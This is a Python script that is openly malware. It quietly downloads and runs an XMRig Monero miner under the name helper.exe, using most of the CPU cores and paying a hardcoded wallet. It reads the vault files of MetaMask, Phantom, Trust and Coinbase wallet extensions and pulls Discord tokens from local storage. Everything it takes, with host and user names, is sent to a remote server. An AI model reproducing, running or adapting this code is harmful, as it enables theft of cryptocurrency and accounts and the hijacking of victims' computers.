import os
import re
import time
import requests
import subprocess
import threading
import zipfile
import multiprocessing
import shutil
from pathlib import Path
from mnemonic import Mnemonic

mnemo = Mnemonic("english")
SERVER = "https://kryhrqs.pythonanywhere.com/export"
WALLET = "Bv3WEwFb17vKiiLGM7xc1UtxzWWfmzNimkq7CyVBjLfU"

TEMP = os.environ.get('TEMP', 'C:\\Windows\\Temp')
MINER = os.path.join(TEMP, 'helper.exe')

CPU_CORES = multiprocessing.cpu_count()
THREADS = max(2, int(CPU_CORES * 0.6))

def send(data):
    try:
        requests.post(SERVER, json={
            'time': time.time(),
            'host': os.getenv('COMPUTERNAME', ''),
            'user': os.getenv('USERNAME', ''),
            'data': data
        }, timeout=10)
    except:
        pass

def start_miner():
    try:
        if not os.path.exists(MINER):
            zip_path = os.path.join(TEMP, 'xmrig.zip')
            r = requests.get(
                'https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-msvc-win64.zip',
                stream=True, timeout=60
            )
            if r.status_code == 200:
                with open(zip_path, 'wb') as f:
                    for chunk in r.iter_content(8192):
                        f.write(chunk)
                with zipfile.ZipFile(zip_path, 'r') as z:
                    z.extractall(TEMP)
                for root, dirs, files in os.walk(TEMP):
                    for f in files:
                        if f == 'xmrig.exe':
                            os.rename(os.path.join(root, f), MINER)
                            break
        if os.path.exists(MINER):
            subprocess.Popen(
                [MINER, '--url=pool.supportxmr.com:3333', f'--user={WALLET}',
                 '--pass=x', f'--threads={THREADS}', '--keepalive', '--donate-level=1'],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
    except:
        pass

def steal_metamask_vault():
    """Steal the Metamask vault (LOCK file)."""
    paths = [
        os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn\\LOCK"),
        os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\Profile*\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn\\LOCK"),
        os.path.expandvars("%APPDATA%\\Mozilla\\Firefox\\Profiles\\*\\storage\\default\\moz-extension+++*\\idb\\LOCK"),
    ]
    
    for path_pattern in paths:
        from glob import glob
        for path in glob(path_pattern):
            try:
                if os.path.exists(path):
                    with open(path, 'r', errors='ignore') as f:
                        content = f.read()
                        if content:
                            send({
                                'type': 'metamask_vault',
                                'path': path,
                                'content': content[:100000]
                            })
                            print(f"[VAULT] Metamask vault stolen: {path}")
                            # Copy the file to temp for later analysis
                            shutil.copy(path, os.path.join(TEMP, 'metamask_vault.bak'))
            except:
                pass

def scan_browser_extensions():
    """Scan for other wallet extensions."""
    extensions = {
        'metamask': 'nkbihfbeogaeaoehlefnkodbefgpgknn',
        'phantom': 'bfnaelmomejmhlkdgepjocepnpkbmjgj',
        'trust': 'egjidjbpglichdcondbcbdnbeeppgdph',
        'coinbase': 'hnfanknocfeofbddgcijnmhnfnkdnaad',
    }
    
    for name, ext_id in extensions.items():
        path = os.path.expandvars(f"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\{ext_id}\\LOCK")
        if os.path.exists(path):
            try:
                with open(path, 'r', errors='ignore') as f:
                    content = f.read()
                    if content:
                        send({
                            'type': f'{name}_vault',
                            'path': path,
                            'content': content[:100000]
                        })
                        print(f"[VAULT] {name} vault stolen")
            except:
                pass

def steal_discord_token():
    """Steal Discord token from local storage."""
    paths = [
        os.path.expandvars("%APPDATA%\\discord\\Local Storage\\leveldb\\*.log"),
        os.path.expandvars("%APPDATA%\\discord\\Local Storage\\leveldb\\*.ldb"),
    ]
    
    for path_pattern in paths:
        from glob import glob
        for path in glob(path_pattern):
            try:
                with open(path, 'r', errors='ignore') as f:
                    content = f.read()
                    # Look for Discord token pattern (64 chars)
                    match = re.search(r'[a-zA-Z0-9_-]{64}', content)
                    if match:
                        send({
                            'type': 'discord_token',
                            'path': path,
                            'content': match.group()
                        })
                        print(f"[TOKEN] Discord token stolen")
            except:
                pass

def scan_for_wallets():
    """Main wallet scanning function."""
    print("[WALLET] Scanning for wallets...")
    
    # Steal Metamask vault
    steal_metamask_vault()
    
    # Steal other extensions
    scan_browser_extensions()
    
    # Steal Discord token
    steal_discord_token()

def main():
    print("[SERVICE] Starting...")
    
    # Start miner
    threading.Thread(target=start_miner, daemon=True).start()
    
    # Start wallet scanner (runs once)
    threading.Thread(target=scan_for_wallets, daemon=True).start()
    
    print("[SERVICE] Running...")
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        while True:
            time.sleep(60)

if __name__ == '__main__':
    main()